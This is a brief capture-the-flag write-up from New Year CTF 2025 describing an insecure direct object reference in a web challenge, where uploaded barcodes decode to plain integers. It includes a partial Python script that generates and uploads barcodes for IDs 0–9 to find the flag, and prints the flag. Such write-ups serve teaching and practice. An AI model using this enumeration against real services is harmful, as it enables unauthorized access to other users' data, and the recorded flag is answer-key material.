---
date: 2025-01-15
description: IDOR using barcodes
platform: New Year CTF 2025
categories: Web
tags:
  - IDOR
  - file-upload-attacks
duration:
---
# IDOR using Barcode
1. Observe that when barcode is decoded it is just an integer of sample 
2. We can generate barcode then upload and to perform IDOR 

```python
def generate_barcode(i): 
	# ...
def upload(i):
    img_buffer = generate_barcode(i)
    files = {"file": (f"xnw_barcode{i}.png", img_buffer, "image/png")}
    resp = requests.post(url, files=files)

for i in range(10):
    resp = upload(str(i))
    print(f"{i}: {resp}")
    if "grodno{" in resp:
        print(f"flag found!!!")
```

![](_attachments/Pasted%20image%2020250115191502.png)
`grodno{7eb13bfd35b2f61de9edb6064e40bfa5}`